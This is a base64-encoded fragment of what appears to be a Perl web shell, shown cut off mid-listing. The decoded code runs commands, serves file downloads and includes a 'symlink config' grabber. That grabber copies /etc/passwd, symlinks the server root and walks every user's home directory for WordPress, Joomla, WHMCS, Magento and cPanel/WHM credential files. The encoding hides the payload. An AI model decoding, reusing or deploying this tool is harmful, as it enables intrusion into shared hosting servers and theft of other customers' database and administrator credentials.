ICAgIH0NCiAgICAgICAgaWYoISRXaW5OVCkNCiAgICAgICAgew0KICAgICAgICAgICAgYWxhcm0oMCk7DQogICAgICAgIH0NCiAgICAgICAgcHJpbnQgIjwveG1wPiI7DQogICAgfQ0KICAgICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KICAgICZQcmludFBhZ2VGb290ZXI7DQp9DQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQpsb2NhbCgkRmlsZVVybCkgPSBAXzsNCmlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0Kew0KIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCnByaW50IDw8RU5EOw0KPGNvZGU+DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4uDQo8L2NvZGU+DQpFTkQNCiZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCmVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCnByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCnN1YiBTeW1Db25maWcNCnsNCiMhL3Vzci9iaW4vcGVybCAtSS91c3IvbG9jYWwvYmFuZG1pbg0KdXNlIEZpbGU6OkNvcHk7IHVzZSBzdHJpY3Q7IHVzZSB3YXJuaW5nczsgdXNlIE1JTUU6OkJhc2U2NDsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCmlmICghLWUgJGZpbGVuYW1lKSB7IGNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCn0NCm1rZGlyICJzeW1saW5rX2NvbmZpZyI7DQpzeW1saW5rKCIvIiwic3ltbGlua19jb25maWcvcm9vdCIpOw0KbXkgJGh0YWNjZXNzID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtRV1JrVkhsd1pTQjBaWGgwTDNCc1lXbHVJQzV3YUhBZ0RRcEJaR1JJWVc1a2JHVnlJSFJsZUhRdmNHeGhhVzRnTG5Cb2NBMEtVMkYwYVhObWVTQkJibmtOQ2tsdVpHVjRUM0IwYVc5dWN5QXJRMmhoY25ObGREMVZWRVl0T0NBclJtRnVZM2xKYm1SbGVHbHVaeUFyU1dkdWIzSmxRMkZ6WlNBclJtOXNaR1Z5YzBacGNuTjBJQ3RZU0ZSTlRDQXJTRlJOVEZSaFlteGxJQ3RUZFhCd2NtVnpjMUoxYkdWeklDdFRkWEJ3Y21WemMwUmxjMk55YVhCMGFXOXVJQ3RPWVcxbFYybGtkR2c5S2lBTkNrbHVaR1Y0U1dkdWIzSmxJQ291ZEhoME5EQTBEUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLbk41Yld4cGJtdGZZMjl1Wm1sbklGdE9RMTBOQ2xKbGQzSnBkR1ZTZFd4bElGd3VkSGgwSkNBbGUxSkZVVlZGVTFSZlZWSkpmVFF3TkNCYlRDeFNQVE13TWk1T1ExMD0iKTsNCm15ICR4c3ltNDA0ID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtTR1ZoWkdWeVRtRnRaU0J3Y0hFdWRIaDBEUXBUWVhScGMyWjVJRUZ1ZVEwS1NXNWtaWGhQY0hScGIyNXpJRWxuYm05eVpVTmhjMlVnUm1GdVkzbEpibVJsZUdsdVp5QkdiMnhrWlhKelJtbHljM1FnVG1GdFpWZHBaSFJvUFNvZ1JHVnpZM0pwY0hScGIyNVhhV1IwYUQwcUlGTjFjSEJ5WlhOelNGUk5URkJ5WldGdFlteGxEUXBKYm1SbGVFbG5ibTl5WlNBcSIpOw0Kb3BlbihteSAkZmgxLCAnPicsICdzeW1saW5rX2NvbmZpZy8uaHRhY2Nlc3MnKTsgcHJpbnQgJGZoMSAiJGh0YWNjZXNzIjsgY2xvc2UgJGZoMTsgb3BlbihteSAkeHgsICc+JywgJ3N5bWxpbmtfY29uZmlnL25lbXUudHh0Jyk7IHByaW50ICR4eCAiJHhzeW00MDQiOyBjbG9zZSAkeHg7IG9wZW4obXkgJGZoLCAnPDplbmNvZGluZyhVVEYtOCknLCAkZmlsZW5hbWUpOyB3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7IG15IEBtYXRjaGVzID0gJHJvdyA9fiAvKC4qPyk6eDovZzsgbXkgJHVzZXJueWEgPSAkMTsgbXkgQGFycmF5ID0gKCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvLmFjY2Vzc2hhc2gnLCB0eXBlID0+ICdXSE0tYWNjZXNzaGFzaCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsIHR5cGUgPT4gJ0xva29tZWRpYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywgdHlwZSA9PiAnQmFsaXRiYW5nJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCB0eXBlID0+ICdQcmVzdGFTaG9wJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsIHR5cGUgPT4gJ09wZW5DYXJ0JyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcsIHR5cGUgPT4gJ0VsbGlzbGFiJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dQL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YxL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdeV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3QvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3MxL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NBUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09SREVSL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVEFSRUEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JVWS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CdXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01BTkFHRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFNVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iYXNrZXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGly